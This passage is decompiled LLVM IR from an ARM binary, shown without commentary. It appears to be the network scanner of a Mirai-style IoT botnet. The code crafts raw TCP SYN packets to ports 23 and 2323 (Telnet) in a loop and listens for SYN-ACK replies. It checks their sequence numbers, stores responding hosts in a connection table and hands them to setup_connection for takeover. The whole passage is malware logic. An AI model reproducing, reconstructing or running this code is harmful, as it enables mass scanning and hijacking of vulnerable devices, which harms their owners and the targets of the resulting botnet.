  br i1 %v9_10718, label %bb367, label %.thread42

.thread42:                                        ; preds = %dec_label_pc_106bc
  store i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_106f4, i16* bitcast (i32* @global_var_24362.323 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32 2) to i16*), align 2
  %v4_10738 = load i32, i32* @global_var_24368.324, align 4
  store i32 %v4_10738, i32* @global_var_24370.326, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb368

bb367:                                            ; preds = %dec_label_pc_106bc
  store i16 %v4_106f4, i16* bitcast (i32* @global_var_24362.323 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* %r0.global-to-local, align 4
  %v4_1073836 = load i32, i32* @global_var_24368.324, align 4
  store i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_1073836, i32* @global_var_24370.326, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32 2) to i16*), align 2
  br label %bb368

bb368:                                            ; preds = %.thread42, %bb367
  store i16 0, i16* bitcast (i32* @global_var_2437c.327 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_2436c.204 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_10764 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_24358.201 to i32), i32 sext (i16 ptrtoint (i16* @global_var_2436c.204 to i16) to i32), i32 5120, i32 20)
  %v7_10764 = trunc i32 %v6_10764 to i16
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* %r1.global-to-local, align 4
  %v2_10770 = load i32, i32* @global_var_26e70.199, align 4
  store i16 %v7_10764, i16* bitcast (i32* @global_var_2437c.327 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_1079c = load i16, i16* @global_var_2436e.209, align 2
  %v4_1079c = zext i16 %v3_1079c to i32
  store i32 %v4_1079c, i32* @lr, align 4
  store i32 %v2_1055c, i32* %ip.global-to-local, align 4
  store i32 %v2_10770, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_107b8 = call i32 @__libc_sendto(i32 %v2_10770, i32 ptrtoint (i8** @global_var_24358.201 to i32), i32 40, i32 16384, i32 %v2_10564, i32 16)
  store i32 %v7_107b8, i32* %r0.global-to-local, align 4
  %v3_107bc = load i32, i32* %stack_var_-52, align 4
  %v1_107c0 = add i32 %v3_107bc, 1
  store i32 %v1_107c0, i32* %r3.global-to-local, align 4
  %v3_107c4 = icmp ugt i32 %v1_107c0, 319
  store i1 %v3_107c4, i1* %cpsr_c.global-to-local, align 1
  %v8_107c4 = icmp eq i32 %v1_107c0, 320
  store i1 %v8_107c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_107c0, i32* %stack_var_-52, align 4
  %v5_107cc = icmp slt i32 %v1_107c0, 320
  br i1 %v5_107cc, label %dec_label_pc_10568, label %dec_label_pc_107d0

dec_label_pc_107d0:                               ; preds = %bb368
  %v0_107d0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %dec_label_pc_10544, %dec_label_pc_107d0
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_10544 ], [ %v0_107d0, %dec_label_pc_107d0 ]
  %v0_107d4 = call i32 @__GI___errno_location()
  store i32 %v0_10850, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_107e4 = add i32 %v0_10850, 20
  store i32 %v1_107e4, i32* @r4, align 4
  %v2_107f0 = inttoptr i32 %v0_107d4 to i32*
  %v1_10840 = add i32 %v0_10850, 16
  %v2_10840 = inttoptr i32 %v1_10840 to i32*
  %v4_1087c = sext i16 %stack_var_-1884.0 to i32
  %v1_10850 = add i32 %v0_10850, 9
  %v2_10850 = inttoptr i32 %v1_10850 to i8*
  %v1_108e4 = add i32 %v0_10850, 12
  %v2_108e4 = inttoptr i32 %v1_108e4 to i32*
  br label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %dec_label_pc_108ac, %dec_label_pc_108a4, %dec_label_pc_1089c, %dec_label_pc_10878, %dec_label_pc_10868, %dec_label_pc_10850, %dec_label_pc_10838, %dec_label_pc_10894, %dec_label_pc_10888, %dec_label_pc_10830, %dec_label_pc_10964, %dec_label_pc_107d4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_107f0, align 4
  %v2_107f8 = load i32, i32* @global_var_26e70.199, align 4
  store i32 %v2_107f8, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v0_10850, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1080c = load i32, i32* %ip.global-to-local, align 4
  %v6_10814 = call i32 @__libc_recvfrom(i32 %v2_107f8, i32 %v0_10850, i32 1514, i32 16384, i32 %v0_1080c, i32 %v0_1080c)
  store i32 %v6_10814, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10818 = icmp eq i32 %v6_10814, 0
  store i1 %v2_10818, i1* %cpsr_z.global-to-local, align 1
  %tmp369 = icmp slt i32 %v6_10814, 1
  br i1 %tmp369, label %dec_label_pc_10988, label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %dec_label_pc_107e8
  store i32 %v0_107d4, i32* %ip.global-to-local, align 4
  %v2_10824 = load i32, i32* %v2_107f0, align 4
  store i32 %v2_10824, i32* %r3.global-to-local, align 4
  %v2_10828 = icmp ugt i32 %v2_10824, 10
  store i1 %v2_10828, i1* %cpsr_c.global-to-local, align 1
  %v7_10828 = icmp eq i32 %v2_10824, 11
  store i1 %v7_10828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10828, label %dec_label_pc_10988, label %dec_label_pc_10830

dec_label_pc_10830:                               ; preds = %dec_label_pc_10820
  %v2_10830 = icmp ugt i32 %v6_10814, 38
  store i1 %v2_10830, i1* %cpsr_c.global-to-local, align 1
  %v7_10830 = icmp eq i32 %v6_10814, 39
  store i1 %v7_10830, i1* %cpsr_z.global-to-local, align 1
  %v2_10834 = xor i1 %v2_10830, true
  %v3_10834 = or i1 %v7_10830, %v2_10834
  br i1 %v3_10834, label %dec_label_pc_107e8, label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %dec_label_pc_10830
  store i32 %v0_10850, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_26e50.101 to i32), i32* %r0.global-to-local, align 4
  %v3_10840 = load i32, i32* %v2_10840, align 4
  store i32 %v3_10840, i32* %r2.global-to-local, align 4
  %v2_10844 = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_10844, i32* %r3.global-to-local, align 4
  %v3_10848 = icmp uge i32 %v3_10840, %v2_10844
  store i1 %v3_10848, i1* %cpsr_c.global-to-local, align 1
  %v9_10848 = icmp eq i32 %v3_10840, %v2_10844
  store i1 %v9_10848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10848, label %dec_label_pc_10850, label %dec_label_pc_107e8

dec_label_pc_10850:                               ; preds = %dec_label_pc_10838
  %v3_10850 = load i8, i8* %v2_10850, align 1
  %v4_10850 = zext i8 %v3_10850 to i32
  store i32 %v4_10850, i32* %r3.global-to-local, align 4
  %v2_10854 = icmp ugt i8 %v3_10850, 5
  store i1 %v2_10854, i1* %cpsr_c.global-to-local, align 1
  %v7_10854 = icmp eq i8 %v3_10850, 6
  store i1 %v7_10854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10854, label %dec_label_pc_1085c, label %dec_label_pc_107e8

dec_label_pc_1085c:                               ; preds = %dec_label_pc_10850
  %v0_1085c = load i32, i32* @r4, align 4
  %v1_1085c = inttoptr i32 %v0_1085c to i16*
  %v2_1085c = load i16, i16* %v1_1085c, align 2
  %v3_1085c = zext i16 %v2_1085c to i32
  store i32 %v3_1085c, i32* %ip.global-to-local, align 4
  %v2_10860 = icmp ugt i16 %v2_1085c, 5887
  store i1 %v2_10860, i1* %cpsr_c.global-to-local, align 1
  %v7_10860 = icmp eq i16 %v2_1085c, 5888
  store i1 %v7_10860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10860, label %dec_label_pc_10878, label %dec_label_pc_10868

dec_label_pc_10868:                               ; preds = %dec_label_pc_1085c
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_10870 = icmp ugt i16 %v2_1085c, 4872
  store i1 %v3_10870, i1* %cpsr_c.global-to-local, align 1
  %v9_10870 = icmp eq i16 %v2_1085c, 4873
  store i1 %v9_10870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10870, label %dec_label_pc_10878, label %dec_label_pc_107e8

dec_label_pc_10878:                               ; preds = %dec_label_pc_10868, %dec_label_pc_1085c
  %v1_10878 = add i32 %v0_1085c, 2
  %v2_10878 = inttoptr i32 %v1_10878 to i16*
  %v3_10878 = load i16, i16* %v2_10878, align 2
  %v4_10878 = zext i16 %v3_10878 to i32
  store i32 %v4_10878, i32* %r3.global-to-local, align 4
  store i32 %v4_1087c, i32* %r1.global-to-local, align 4
  %v3_10880 = icmp uge i32 %v4_10878, %v4_1087c
  store i1 %v3_10880, i1* %cpsr_c.global-to-local, align 1
  %v9_10880 = icmp eq i32 %v4_10878, %v4_1087c
  store i1 %v9_10880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10880, label %dec_label_pc_10888, label %dec_label_pc_107e8

dec_label_pc_10888:                               ; preds = %dec_label_pc_10878
  %v1_10888 = add i32 %v0_1085c, 13
  %v2_10888 = inttoptr i32 %v1_10888 to i8*
  %v3_10888 = load i8, i8* %v2_10888, align 1
  %v4_10888 = zext i8 %v3_10888 to i32
  store i32 %v4_10888, i32* %r3.global-to-local, align 4
  %v1_1088c = and i32 %v4_10888, 2
  %v2_1088c = icmp eq i32 %v1_1088c, 0
  store i1 %v2_1088c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1088c, label %dec_label_pc_107e8, label %dec_label_pc_10894

dec_label_pc_10894:                               ; preds = %dec_label_pc_10888
  %v1_10894 = and i32 %v4_10888, 16
  %v2_10894 = icmp eq i32 %v1_10894, 0
  store i1 %v2_10894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10894, label %dec_label_pc_107e8, label %dec_label_pc_1089c

dec_label_pc_1089c:                               ; preds = %dec_label_pc_10894
  %v1_1089c = and i32 %v4_10888, 4
  %v2_1089c = icmp eq i32 %v1_1089c, 0
  store i1 %v2_1089c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1089c, label %dec_label_pc_108a4, label %dec_label_pc_107e8

dec_label_pc_108a4:                               ; preds = %dec_label_pc_1089c
  %tmp517 = urem i8 %v3_10888, 2
  %v2_108a4 = icmp eq i8 %tmp517, 0
  store i1 %v2_108a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108a4, label %dec_label_pc_108ac, label %dec_label_pc_107e8

dec_label_pc_108ac:                               ; preds = %dec_label_pc_108a4
  %v1_108ac = add i32 %v0_1085c, 8
  %v2_108ac = inttoptr i32 %v1_108ac to i32*
  %v3_108ac = load i32, i32* %v2_108ac, align 4
  %v5_108c4 = call i32 @llvm.bswap.i32(i32 %v3_108ac)
  %v1_108c8 = add i32 %v5_108c4, -1
  store i32 %v1_108c8, i32* %r2.global-to-local, align 4
  %v3_108d0 = udiv i32 %v1_108c8, 16777216
  %v1_108cc = udiv i32 %v1_108c8, 256
  %v4_108d4 = and i32 %v1_108cc, 65280
  %v5_108d4 = or i32 %v4_108d4, %v3_108d0
  store i32 %v0_10850, i32* %r0.global-to-local, align 4
  %v1_108dc = and i32 %v1_108c8, 65280
  store i32 %v1_108dc, i32* %r1.global-to-local, align 4
  %v4_108e0 = mul nuw nsw i32 %v1_108dc, 256
  %v5_108e0 = or i32 %v5_108d4, %v4_108e0
  store i32 %v5_108e0, i32* %r3.global-to-local, align 4
  %v3_108e4 = load i32, i32* %v2_108e4, align 4
  store i32 %v3_108e4, i32* @lr, align 4
  %v5_108e8 = call i32 @llvm.bswap.i32(i32 %v1_108c8)
  store i32 %v5_108e8, i32* %r3.global-to-local, align 4
  %v3_108ec = icmp uge i32 %v5_108e8, %v3_108e4
  store i1 %v3_108ec, i1* %cpsr_c.global-to-local, align 1
  %v9_108ec = icmp eq i32 %v5_108e8, %v3_108e4
  store i1 %v9_108ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_108ec, label %dec_label_pc_108f4, label %dec_label_pc_107e8

dec_label_pc_108f4:                               ; preds = %dec_label_pc_108ac
  %v0_108f4 = load i32, i32* @r5, align 4
  %v2_108f4 = icmp ugt i32 %v0_108f4, 254
  store i1 %v2_108f4, i1* %cpsr_c.global-to-local, align 1
  %v7_108f4 = icmp eq i32 %v0_108f4, 255
  store i1 %v7_108f4, i1* %cpsr_z.global-to-local, align 1
  %v8_108f8 = icmp sgt i32 %v0_108f4, 255
  br i1 %v8_108f8, label %dec_label_pc_10988, label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108f4
  %v2_10904 = load i32, i32* @global_var_26e6c.197, align 4
  store i32 %v2_10904, i32* %r1.global-to-local, align 4
  %v3_10908 = mul i32 %v0_108f4, 512
  store i32 %v3_10908, i32* %r2.global-to-local, align 4
  %v2_1090c = mul i32 %v0_108f4, 544
  store i32 %v2_1090c, i32* %r3.global-to-local, align 4
  %v2_10910 = add i32 %v2_10904, %v2_1090c
  store i32 %v2_10910, i32* @r0, align 4
  %v1_10914 = add i32 %v2_10910, 12
  %v2_10914 = inttoptr i32 %v1_10914 to i32*
  %v3_10914 = load i32, i32* %v2_10914, align 4
  store i32 %v3_10914, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10918 = icmp eq i32 %v3_10914, 0
  store i1 %v2_10918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10918, label %dec_label_pc_1095c, label %dec_label_pc_10938.preheader

dec_label_pc_10938.preheader:                     ; preds = %dec_label_pc_108fc
  %v2_1091c = add i32 %v0_108f4, 1
  %v2_10924 = and i32 %v2_1091c, 134217728
  %v3_10924 = icmp ne i32 %v2_10924, 0
  store i1 %v3_10924, i1* %cpsr_c.global-to-local, align 1
  %v3_10928 = mul i32 %v2_1091c, 544
  %v3_1092c = add i32 %v2_10904, %v3_10928
  store i32 %v3_1092c, i32* %r3.global-to-local, align 4
  store i32 %v0_108f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10938

dec_label_pc_10938:                               ; preds = %dec_label_pc_10938.preheader, %dec_label_pc_10944
  %v0_10944 = phi i32 [ %v3_1092c, %dec_label_pc_10938.preheader ], [ %v1_10950, %dec_label_pc_10944 ]
  %v0_10938 = phi i32 [ %v0_108f4, %dec_label_pc_10938.preheader ], [ %v1_10938, %dec_label_pc_10944 ]
  %v1_10938 = add i32 %v0_10938, 1
  store i32 %v1_10938, i32* %r2.global-to-local, align 4
  %v7_1093c = icmp eq i32 %v1_10938, 256
  br i1 %v7_1093c, label %dec_label_pc_10988.loopexit, label %dec_label_pc_10944

dec_label_pc_10944:                               ; preds = %dec_label_pc_10938
  store i32 %v0_10944, i32* @r0, align 4
  %v1_10948 = add i32 %v0_10944, 12
  %v2_10948 = inttoptr i32 %v1_10948 to i32*
  %v3_10948 = load i32, i32* %v2_10948, align 4
  %v2_1094c = icmp eq i32 %v3_10948, 0
  %v1_10950 = add i32 %v0_10944, 544
  store i32 %v1_10950, i32* %r3.global-to-local, align 4
  br i1 %v2_1094c, label %dec_label_pc_10958, label %dec_label_pc_10938

dec_label_pc_10958:                               ; preds = %dec_label_pc_10944
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10938, i32* @r5, align 4
  br label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_108fc, %dec_label_pc_10958
  %v1_10964 = phi i32 [ %v2_10910, %dec_label_pc_108fc ], [ %v0_10944, %dec_label_pc_10958 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1095c = icmp eq i32 %v1_10964, 0
  store i1 %v2_1095c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1095c, label %dec_label_pc_10988, label %dec_label_pc_10964

dec_label_pc_10964:                               ; preds = %dec_label_pc_1095c
  %v2_10964 = add i32 %v1_10964, 16
  %v3_10964 = inttoptr i32 %v2_10964 to i32*
  store i32 %v3_108e4, i32* %v3_10964, align 4
  %v0_10968 = load i32, i32* %ip.global-to-local, align 4
  %v1_10968 = trunc i32 %v0_10968 to i16
  %v2_10968 = load i32, i32* @r0, align 4
  %v3_10968 = add i32 %v2_10968, 20
  %v4_10968 = inttoptr i32 %v3_10968 to i16*
  store i16 %v1_10968, i16* %v4_10968, align 2
  %v0_1096c = call i32 @setup_connection()
  store i32 %v0_1096c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107e8

dec_label_pc_10974:                               ; preds = %dec_label_pc_ffd8
  store i32 ptrtoint (i32* @global_var_26e70.199 to i32), i32* %ip.global-to-local, align 4
  %v2_10978 = load i32, i32* @global_var_26e70.199, align 4
  store i32 %v2_10978, i32* %r0.global-to-local, align 4
  %v1_1097c = call i32 @__GI___libc_close(i32 %v2_10978)
  store i32 %v1_1097c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10980

dec_label_pc_10980:                               ; preds = %dec_label_pc_ffb4, %dec_label_pc_10974
  %v0_10980 = load i32, i32* @r5, align 4
  store i32 %v0_10980, i32* %r0.global-to-local, align 4
  %v1_10984 = call i32 @__GI_exit(i32 %v0_10980)
  store i32 %v1_10984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10988

dec_label_pc_10988.loopexit:                      ; preds = %dec_label_pc_10938
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10988

dec_label_pc_10988:                               ; preds = %dec_label_pc_1095c, %dec_label_pc_108f4, %dec_label_pc_10820, %dec_label_pc_107e8, %dec_label_pc_10988.loopexit, %dec_label_pc_10980
  %stack_var_-1876.0 = phi i32 [ %tmp298, %dec_label_pc_10980 ], [ %v0_107d4, %dec_label_pc_10988.loopexit ], [ %v0_107d4, %dec_label_pc_107e8 ], [ %v0_107d4, %dec_label_pc_10820 ], [ %v0_107d4, %dec_label_pc_108f4 ], [ %v0_107d4, %dec_label_pc_1095c ]
  %stack_var_-1880.2 = phi i32 [ %tmp302, %dec_label_pc_10980 ], [ %stack_var_-1880.1, %dec_label_pc_10988.loopexit ], [ %stack_var_-1880.1, %dec_label_pc_107e8 ], [ %stack_var_-1880.1, %dec_label_pc_10820 ], [ %stack_var_-1880.1, %dec_label_pc_108f4 ], [ %stack_var_-1880.1, %dec_label_pc_1095c ]
  %stack_var_-1888.1 = phi i32 [ %tmp303, %dec_label_pc_10980 ], [ %v0_10850, %dec_label_pc_10988.loopexit ], [ %v0_10850, %dec_label_pc_107e8 ], [ %v0_10850, %dec_label_pc_10820 ], [ %v0_10850, %dec_label_pc_108f4 ], [ %v0_10850, %dec_label_pc_1095c ]
  %stack_var_-1884.1 = phi i16 [ %tmp304, %dec_label_pc_10980 ], [ %stack_var_-1884.0, %dec_label_pc_10988.loopexit ], [ %stack_var_-1884.0, %dec_label_pc_107e8 ], [ %stack_var_-1884.0, %dec_label_pc_10820 ], [ %stack_var_-1884.0, %dec_label_pc_108f4 ], [ %stack_var_-1884.0, %dec_label_pc_1095c ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_109a8475 = load i32, i32* @sp, align 4
  %v3_109a8476 = add i32 %v2_109a8475, 1676
  %v4_109a8477 = inttoptr i32 %v3_109a8476 to i32*
  store i32 0, i32* %v4_109a8477, align 4
  br label %dec_label_pc_10994.dec_label_pc_10994_crit_edge

dec_label_pc_10994.dec_label_pc_10994_crit_edge:  ; preds = %dec_label_pc_10988, %dec_label_pc_10994.dec_label_pc_10994_crit_edge
  %v0_10994.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10998 = add i32 %v0_10994.pre, 4
  store i32 %v1_10998, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_109a0 = add i32 %v0_10994.pre, 1672
  store i32 %v1_109a0, i32* %ip.global-to-local, align 4
  %v7_109a4 = icmp eq i32 %v1_10998, 128
  %v2_109a8 = load i32, i32* @sp, align 4
  %v3_109a8 = add i32 %v2_109a8, %v1_109a0
  %v4_109a8 = inttoptr i32 %v3_109a8 to i32*
  store i32 0, i32* %v4_109a8, align 4
  br i1 %v7_109a4, label %dec_label_pc_109b0, label %dec_label_pc_10994.dec_label_pc_10994_crit_edge

dec_label_pc_109b0:                               ; preds = %dec_label_pc_10994.dec_label_pc_10994_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_109b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_109b0, i32* %stack_var_-352, align 4
  %v1_109bc469 = add i32 %v0_109b0, 8
  store i32 %v1_109bc469, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_109c4470 = add i32 %v0_109b0, 1548
  store i32 %v1_109c4470, i32* @lr, align 4
  %v7_109c8471 = icmp eq i32 %v1_109bc469, 128
  %v2_109cc472 = load i32, i32* @sp, align 4
  %v3_109cc473 = add i32 %v2_109cc472, %v1_109c4470
  %v4_109cc474 = inttoptr i32 %v3_109cc473 to i32*
  store i32 0, i32* %v4_109cc474, align 4
  br i1 %v7_109c8471, label %dec_label_pc_109d4, label %dec_label_pc_109b8.dec_label_pc_109b8_crit_edge

dec_label_pc_109b8.dec_label_pc_109b8_crit_edge:  ; preds = %dec_label_pc_109b0, %dec_label_pc_109b8.dec_label_pc_109b8_crit_edge
  %v0_109b8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_109bc = add i32 %v0_109b8.pre, 4
  store i32 %v1_109bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_109c4 = add i32 %v0_109b8.pre, 1544
  store i32 %v1_109c4, i32* @lr, align 4
  %v7_109c8 = icmp eq i32 %v1_109bc, 128
  %v2_109cc = load i32, i32* @sp, align 4
  %v3_109cc = add i32 %v2_109cc, %v1_109c4
  %v4_109cc = inttoptr i32 %v3_109cc to i32*
  store i32 0, i32* %v4_109cc, align 4
  br i1 %v7_109c8, label %dec_label_pc_109d4, label %dec_label_pc_109b8.dec_label_pc_109b8_crit_edge

dec_label_pc_109d4:                               ; preds = %dec_label_pc_109b8.dec_label_pc_109b8_crit_edge, %dec_label_pc_109b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_109d4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_109d4, i32* @r6, align 4
  store i32 %v0_109d4, i32* @r5, align 4
  store i32 %v0_109d4, i32* %stack_var_-52, align 4
  %v2_11914 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10a30

dec_label_pc_109e4:                               ; preds = %dec_label_pc_10a60
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10a4c, i1* %cpsr_z.global-to-local, align 1
  %v1_11908 = add i32 %v2_10a44, 4
  %v2_11908 = inttoptr i32 %v1_11908 to i32*
  %v3_11908 = load i32, i32* %v2_11908, align 4
  br i1 %v7_10a4c, label %dec_label_pc_11908, label %dec_label_pc_109ec

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109e4
  store i32 %v3_11908, i32* %ip.global-to-local, align 4
  %v3_109f0 = udiv i32 %v3_11908, 32
  store i32 %v2_11914, i32* %r0.global-to-local, align 4
  %v3_109f8 = mul nuw nsw i32 %v3_109f0, 4
  %v2_109fc = add i32 %v3_109f8, %v2_11914
  store i32 %v2_109fc, i32* %r3.global-to-local, align 4
  %v1_10a00 = add i32 %v2_109fc, -184
  %v2_10a00 = inttoptr i32 %v1_10a00 to i32*
  %v3_10a00 = load i32, i32* %v2_10a00, align 4
  %v1_10a04 = urem i32 %v3_11908, 32
  store i32 %v1_10a04, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10a0c = shl i32 1, %v1_10a04
  %v8_10a0c = or i32 %v3_10a00, %v7_10a0c
  store i32 %v8_10a0c, i32* %r2.global-to-local, align 4
  store i32 %v8_10a0c, i32* %v2_10a00, align 4
  %v0_10a14 = load i32, i32* @r6, align 4
  %v1_10a14 = load i32, i32* %ip.global-to-local, align 4
  %v3_10a14 = icmp uge i32 %v0_10a14, %v1_10a14
  store i1 %v3_10a14, i1* %cpsr_c.global-to-local, align 1
  %v9_10a14 = icmp eq i32 %v0_10a14, %v1_10a14
  store i1 %v9_10a14, i1* %cpsr_z.global-to-local, align 1
  %v5_10a18 = icmp slt i32 %v0_10a14, %v1_10a14
  br i1 %v5_10a18, label %bb370, label %bb371

bb370:                                            ; preds = %dec_label_pc_109ec
  store i32 %v1_10a14, i32* @r6, align 4
  br label %bb371

bb371:                                            ; preds = %.thread57, %bb377, %bb375, %bb420, %dec_label_pc_10ac4, %dec_label_pc_109ec, %bb370
  %v3_10a1c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10a1c, i32* %r3.global-to-local, align 4
  %v1_10a20 = add i32 %v3_10a1c, 1
  store i32 %v1_10a20, i32* %r2.global-to-local, align 4
  %v2_10a24 = icmp ugt i32 %v1_10a20, 254
  store i1 %v2_10a24, i1* %cpsr_c.global-to-local, align 1
  %v7_10a24 = icmp eq i32 %v1_10a20, 255
  store i1 %v7_10a24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10a20, i32* %stack_var_-52, align 4
  %v8_10a2c = icmp sgt i32 %v1_10a20, 255
  br i1 %v8_10a2c, label %dec_label_pc_10ad0, label %dec_label_pc_10a30

dec_label_pc_10a30:                               ; preds = %bb371, %dec_label_pc_109d4
  %v0_10a3c = phi i32 [ %v1_10a20, %bb371 ], [ %v0_109d4, %dec_label_pc_109d4 ]
  store i32 ptrtoint (i32* @global_var_26e6c.197 to i32), i32* %r0.global-to-local, align 4
  %v3_10a34 = mul i32 %v0_10a3c, 512
  store i32 %v3_10a34, i32* %r3.global-to-local, align 4
  %v2_10a38 = load i32, i32* @global_var_26e6c.197, align 4
  store i32 %v2_10a38, i32* %r1.global-to-local, align 4
  %v2_10a40 = mul i32 %v0_10a3c, 544
  store i32 %v2_10a40, i32* %r2.global-to-local, align 4
  %v2_10a44 = add i32 %v2_10a38, %v2_10a40
  store i32 %v2_10a44, i32* @r4, align 4
  %v1_10a48 = add i32 %v2_10a44, 12
  %v2_10a48 = inttoptr i32 %v1_10a48 to i32*
  %v3_10a48 = load i32, i32* %v2_10a48, align 4
  store i32 %v3_10a48, i32* %ip.global-to-local, align 4
  %v2_10a4c = icmp ne i32 %v3_10a48, 0
  store i1 %v2_10a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a4c = icmp eq i32 %v3_10a48, 1
  store i1 %v7_10a4c, i1* %cpsr_z.global-to-local, align 1
  %v2_10a50 = xor i1 %v2_10a4c, true
  %v3_10a50 = or i1 %v7_10a4c, %v2_10a50
  br i1 %v3_10a50, label %bb372, label %bb373

bb372:                                            ; preds = %dec_label_pc_10a30
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb373

bb373:                                            ; preds = %dec_label_pc_10a30, %bb372
  %v1_10a70167 = phi i32 [ %v2_10a38, %dec_label_pc_10a30 ], [ 5, %bb372 ]
  %v2_10a54 = xor i1 %v7_10a4c, true
  %v3_10a54 = and i1 %v2_10a4c, %v2_10a54
  br i1 %v3_10a54, label %bb374, label %bb375

bb374:                                            ; preds = %bb373
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb375

bb375:                                            ; preds = %bb373, %bb374
  %v1_10a70 = phi i32 [ %v1_10a70167, %bb373 ], [ 30, %bb374 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a58 = icmp eq i32 %v3_10a48, 0
  store i1 %v2_10a58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a58, label %bb371, label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %bb375
  store i32 ptrtoint (i32* @global_var_24388.186 to i32), i32* %r2.global-to-local, align 4
  %v2_10a64 = load i32, i32* @global_var_24388.186, align 4
  store i32 %v2_10a64, i32* %r3.global-to-local, align 4
  %v1_10a68 = add i32 %v2_10a44, 8
  %v2_10a68 = inttoptr i32 %v1_10a68 to i32*
  %v3_10a68 = load i32, i32* %v2_10a68, align 4
  store i32 %v3_10a68, i32* %r2.global-to-local, align 4
  %v2_10a6c = sub i32 %v2_10a64, %v3_10a68
  store i32 %v2_10a6c, i32* %r3.global-to-local, align 4
  %v3_10a70 = icmp uge i32 %v2_10a6c, %v1_10a70
  store i1 %v3_10a70, i1* %cpsr_c.global-to-local, align 1
  %v9_10a70 = icmp eq i32 %v2_10a6c, %v1_10a70
